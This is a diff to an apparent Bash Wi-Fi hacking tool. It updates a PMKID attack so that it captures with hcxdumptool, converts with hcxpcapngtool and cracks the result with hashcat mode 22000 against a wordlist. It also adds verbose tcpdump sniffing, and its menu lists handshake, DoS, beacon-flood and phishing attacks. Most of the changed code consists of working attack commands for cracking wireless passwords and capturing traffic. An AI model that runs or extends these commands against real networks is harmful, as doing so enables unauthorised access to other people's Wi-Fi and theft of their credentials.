@@ -40,7 +40,7 @@ fedora=$(echo $?)
 #On the basis of the distribution, download the dependencies 
 programs() {
 	
-	dependencias=(aircrack-ng xterm hashcat git nmap hcxdumptool hcxcaptool php dnsmasq hostapd mdk4 gunzip tcpdump)
+	dependencias=(aircrack-ng xterm hashcat git nmap hcxdumptool hcxpcapngtool php dnsmasq hostapd mdk4 gunzip tcpdump)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -146,7 +146,7 @@ programs() {
 			fi
 		done
 	else 
-		echo -e "\n${redColour}[!]$grayColour Can't find your distribution, download these programs manually: aircrack-ng xterm hashcat git nmap hcxdumptool hcxcaptool php dnsmasq hostapd mdk4 gunzip tcpdump" 
+		echo -e "\n${redColour}[!]$grayColour Can't find your distribution, download these programs manually: aircrack-ng xterm hashcat git nmap hcxdumptool hcxpcapngtool php dnsmasq hostapd mdk4 gunzip tcpdump" 
 		sleep 5
 	fi
 }
@@ -285,14 +285,14 @@ pkmid_ataque() {
 	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
 	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i $tar -o Capture --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	xterm -hold -e "hcxdumptool -i $tar -o Capture.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
     echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
-	hcxcaptool -z HASHPMKID Capture; sudo rm Capture 2>/dev/null 
+	hcxpcapngtool -o hash.hc22000 Capture.pcapng > /dev/null 2>&1
 	sleep 1
 	$cleancolor
-	test -f HASHPMKID*
+	test -f hash.hc22000
 	if [ "$(echo $?)" -eq 0 ]; then
 		echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
 		sleep 1
@@ -300,10 +300,10 @@ pkmid_ataque() {
 		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
 		tput civis; echo -e "\n${yellowColour}[*] Preparing the package for brute force..."
-		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
+		hashcat -m 22000 hash.hc22000 $dicc1
 	else 
 		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
-		sleep 2
+		sleep 3
 	fi
 }
 #[7] force brute with aircrack for files or hashes .cap
@@ -518,13 +518,17 @@ beaconflood() {
 #[5] Network traffic with tcpdump
 traffic() {
 	clear; tput civis; echo -e "\n$blueColour[*]$grayColour Starting Network traffic"; sleep 1
-	echo -ne "[?] Do you want to save the captured packets? [Y/N]: " && read captraffic
+	tput cnorm; echo -ne "[?] Do you want to save the captured packets? [Y/N]: " && read captraffic
+	tput civis
 	if [ "$captraffic" == "y" ] || [ "$captraffic" == "Y" ]; then 
-		xterm -hold -e "sudo tcpdump -i $tar -w captraffic.pcap" &
+		xterm -hold -e "sudo tcpdump -i $tar -w captraffic.pcap -v" &
+		echo -e "$redColour[%]$grayColour Network traffic"
 	elif [ "$captraffic" == "N" ] || [ "$captraffic" == "n" ]; then
-		xterm -hold -e "sudo tcpdump -i $tar" &
+		xterm -hold -e "sudo tcpdump -i $tar -v" &
+		echo -e "$redColour[%]$grayColour Network traffic"
 	else
-		xterm -hold -e "sudo tcpdump -i $tar" &
+		xterm -hold -e "sudo tcpdump -i $tar -v" &
+		echo -e "$redColour[%]$grayColour Network traffic"
 	fi
 }
 #banner for attack menu
@@ -562,7 +566,6 @@ else
 	echo -e "${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
 	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
 	$cleancolor
-	sleep 1
 	monitormode
 	while true; do
 		clear
@@ -573,7 +576,7 @@ else
 		echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 		echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
 		echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] NTWK phishing\t[8] Force Brute .cap"
-		echo -e "[2] PMKID Attack\t\t\t\t\t[9] hashed dictionary (Rainbow taibles)"
+		echo -e "[2] PMKID Attack\t\t\t\t\t[9] Hashed Dictionary (Rainbow taibles)"
 		echo -e "[3] DoS Attack"
 		echo -e "[4] Beacon Flood Attack"
 		echo -e "[5] Network traffic"
